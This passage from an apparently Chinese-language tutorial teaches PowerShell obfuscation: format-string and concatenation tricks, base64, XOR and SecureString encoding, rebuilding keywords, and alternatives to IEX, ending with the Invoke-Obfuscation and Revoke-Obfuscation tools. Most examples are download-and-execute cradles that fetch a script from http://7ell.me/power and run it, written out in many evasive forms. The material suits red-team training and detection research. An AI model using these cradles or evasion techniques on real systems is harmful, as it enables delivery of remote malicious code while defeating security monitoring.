格式填充，-f 格式化。
    //将NE download http://分别填到{0},{1},{2}
    IEX ('({0}w-Object {0}t.WebClient).{1}String("{2}7ell.me/power")' -f 'Ne', 'Download','http://') | IEX 
    //示例2
    .("{1}{0}" -f 'X','IE') (&("{3}{2}{1}{0}" -f 'ct','-Obje','w','Ne') ("{0}{2}{1}" -f 'N','nt','et.WebClie')).("{2}{0}{1}{3}" -f 'dSt','rin','Downloa','g').Invoke(("{5}{0}{3}{4}{1}{2}" -f 'tp:/','o','wer','/','7ell.me/p','ht'))
变量拼接
    $c1="(New-Object Net.We"; $c2="bClient).Downlo"; $c3="adString('http://7ell.me/power')";
    1. IEX ($c1,$c2,$c3 -Join '') | IEX
    2. IEX ($c1,$c3 -Join $c2) | IEX
    3. IEX ([string]::Join($c2,$c1,$c3)) | IEX
    4. IEX ([string]::Concat($c1,$c2,$c3)) | IEX
    5. IEX ($c1+$c2+$c3) | IEX 
    6. IEX "$c1$c2$c3" | IEX
**2.5 编码**
Ascii
使用[char]xx 代替字符 如：[char]59–>;
    //不用分号
    $cmd= "$c1~~$c2~~$c3~~$c4"; IEX $cmd.Replace("~~",[string]([char]59)) | IEX
Base64
命令行参数使用
    -EC,-EncodedCommand,-EncodedComman,-EncodedComma,-EncodedComm,......,Enc,-En,E
解码echo 123 的base64 ZQBjAGgAbwAgADEAMgAzAAoA
    1.PS 2.0 ->  [C`onv`ert]::"FromB`Ase6`4Str`ing"('ZQBjAGgAbwAgADEAMgAzAAoA')
    2.PS 3.0+ -> [  Convert  ]::  "FromB`Ase6`4Str`ing"('ZQBjAGgAbwAgADEAMgAzAAoA')
.NET的方法
    IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('ZQBjAGgAbwAgADEAMgAzAAoA')))
其他不同的方式编码 hex/octal/binary/BXOR/etc.
    [Convert]::ToString(1234, 2)
    [Convert]::ToString(1234, 8)
    [Convert]::ToString(1234, 16)
也是转换为16进制
    "{0:X4}" -f 1234  小写： "{0:x4}" -f 1234
    [Byte][Char]([Convert]::ToInt16($_,16)) 
    ($cmd.ToCharArray() | % {[int]$_}) -Join $delim   //可以去掉空白 -Join$delim
    $bytes[$i] = $bytes[$i] -BXOR 0x6A                //可以去点空白  $bytes[$i]-BXOR0x6A)
**SecureString**
关于SecureString: Get-Comamnd *secure-string*
     https://www.pdq.com/blog/secure-password-with-powershell-encrypting-credentials-part-1/
     https://www.pdq.com/blog/secure-password-with-powershell-encrypting-credentials-part-2/
    $secPwd= Read-Host "Enter password" -AsSecureString
    $secPwd= "echo 123" | ConvertTo-SecureString -AsPlainText -Force
    $secPwd| ConvertFrom-SecureString
加密指定key
    $cmd= "code"
    $secCmd= ConvertTo-SecureString $cmd -AsPlainText -Force
    $secCmdPlaintext= $secCmd| ConvertFrom-SecureString -Key (1..16)
    $secCmdPlaintext
解密
    echo xxxx| ConvertTo-SecureString -Key (1..16)
示例
    $cmd= "echo 123"
    $secCmd= ConvertTo-SecureString $cmd -AsPlainText -Force
    $secCmdPlaintext= $secCmd| ConvertFrom-SecureString -Key (1..16)
运行
    $secCmd= $secCmdPlaintext| ConvertTo-SecureString -Key (1..16);([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secCmd))) | IEX
**2.6 自构造关键字替换**
就是在其他命令的输出下查看观察目标字符串位置，然后提取出来。比如DownlaodString的构造替换
    DownloadString == (((New-Object Net.WebClient).PsObject.Methods | Where-Object {$_.Name -like '*wn*d*g'}).Name)
    IEX (New-Object Net.WebClient).(((New-Object Net.WebClient).PsObject.Methods | Where-Object {$_.Name -like '*wn*d*g'}).Name).Invoke('http://7ell.me/power')
再结合get-command的变形
    IEX (.(COMMAND *w-*ct) Net.WebClient).(((.(COMMAND *w-*ct) Net.WebClient).PsObject.Methods | Where-Object {$_.Name -like '*wn*d*g'}).Name).Invoke('http://7ell.me/power')
根据这样的思路结合上面提到的获取环境变量方法，可以把New-Object层层混淆为
    (GV E*onte*).Value.(((GV E*onte*).Value|GM)[6].Name).(((GV E*onte*).Value.(((GV E*onte*).Value|GM)[6].Name).PsObject.Methods|Where{(GCI Variable:_).Value.Name-ilike'*Co*d'}).Name).Invoke((GV E*onte*).Value.(((GV E*onte*).Value|GM)[6].Name).(((GV E*onte*).Value.(((GV E*onte*).Value|GM)[6].Name)|GM|Where{(GCI Variable:_).Value.Name-ilike'G*om*e'}).Name).Invoke('N*ct',$TRUE,1), [System.Management.Automation.CommandTypes]::Cmdlet)
**3\. IEX 的处理与其他执行方法**
经过上面构造可以看到很多都使用Invoke-Expression/IEX命令，.，&符号来执行表达式。
Invoke-Expression/IEX命令是很常用的一个命令， 运行一个以字符串形式提供的PowerShell表达式。
这里也先看看代替IEX的各种执行方式
Get-Alias/GAL
    &(GAL I*X)
    .(LS Alias:/I*X)
    Get-Command/GCM
    .(GCM I*e-E*)
    &(Command I*e-E*)
GetCmdlets (PS1.0+),
    $ExecutionContext.InvokeCommand.GetCmdlets('I*e-E*'),
    //用到环境变量
    &(GV E*Cont* -Va).InvokeCommand.(((GV E*Cont* -Va).InvokeCommand.PsObject.Methods|Where{(GV _ -Va).Name -clike'*Cm*ts'}).Name).Invoke('I*e-E*')
InvokeScript (PS1.0+)
    $ExecutionContext.InvokeCommand.InvokeScript($Script)
    (GV E*Cont* -Va).InvokeCommand.(((GV E*Cont* -Va).InvokeCommand.PsObject.Methods|Where{(GV _ -Va).Name -clike'I*'}).Name).Invoke($Script),
Invoke-Command/ICM
    Invoke-Command ([ScriptBlock]::Create($Script))
    [ScriptBlock]::Create($Script).Invoke()
    .((GV *cut*t -Va).(((GV *cut*t -Va)|Member)[6].Name).(((GV *cut*t -Va).(((GV *cut*t -Va)|Member)[6].Name)|Member|Where-Object{(Get-Variable _ -Va).Name-clike'N*S*B*'}).Name).Invoke($Script))
PS Runspace
    [PowerShell]::Create().AddScript($Script).Invoke()
    Invoke-AsWorkflow (PS3.0+)
    Invoke-AsWorkflow -Expression $Script
提取串联出IEX，也是在其他命令的输出下查看观察目标字符串位置，然后提取出来。
    ($Env:ComSpec[4,26,25]-Join'')
    ((LS env:/Co*pec).Value[4,26,25]-Join'')
    ($ShellId[1]+$ShellId[13]+'x')
    ((GV S*ell*d -Va)[1]+(DIR Variable:S*ell*d).Value[13]+'x')
    ( ([String]''.IndexOf)[0,7,8]-Join'')
    //怎么构造?，比如上面这个 首先查看''|Get-Member有个IndexOf方法，然后看看[String]''.IndexOf的输出，提取出里面的IEX字母
**4\. 相关工具**
**4.1 Invoke-Obfuscation**
这是一个powershell混淆编码框架，基本涵盖了上述的各种混淆方法，
地址：Invoke-Obfuscation
使用方法：
**4.2 Revoke-Obfuscation**
这是一个powershell混淆检测框架，该工具能给出一个脚本是否混淆的
地址：Revoke-Obfuscation
使用方法
    //初始
    Import-Module .Revoke-Obfuscation.psm1 -Verbose
    //gte-filehash没有输入流参数，自己下载一个get-filehash导入即可
    //还有个问题 使用-OutputToDisk输出时，Set-Content没有NoNewline参数，ps5.0没问题。
    //检测每一行的混淆情况
    Get-Content .test.txt|Measure-RvoObfuscation -Verbose -OutputToDisk
    //检测一个文件是否混淆 
    Get-ChildItem .test.txt|Measure-RvoObfuscation -Verbose -OutputToDisk
    //远程检测
    Measure-RvoObfuscation -Url 'http://bit.ly/DBOdemo1' -Verbose -OutputToDisk
    Measure-RvoObfuscation -Url 'http://7ell.me/powershell/rev.ps1' -Verbose
    //从事件了提取ID为4104的日志重组
    Get-ChildItem .Demodemo.evtx | Get-RvoScriptBlock -Verbose
    Get-RvoScriptBlock -Path 'C:WindowsSystem32WinevtLogsMicrosoft-Windows-PowerShell%4Operational.evtx' -Verbose
    Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational | Get-RvoScriptBlock -Verbose
    Get-ChildItem C:MirOrHxAuditFiles*_w32eventlogs.xml | Get-RvoScriptBlock -Verbose
    Get-CSEventLogEntry -LogName Microsoft-Windows-PowerShell/Operational | Get-RvoScriptBlock
    //从事件日志中提取然后检测
    $obfResults = Get-WinEvent -Path .Demodemo.evtx | Get-RvoScriptBlock | Measure-RvoObfuscation -OutputToDisk -Verbose
当使用上面的混淆框架Invoke-Obfuscation的个汇总混淆方法生成几个样本。
使用该工具进行检测测试
批量检测结果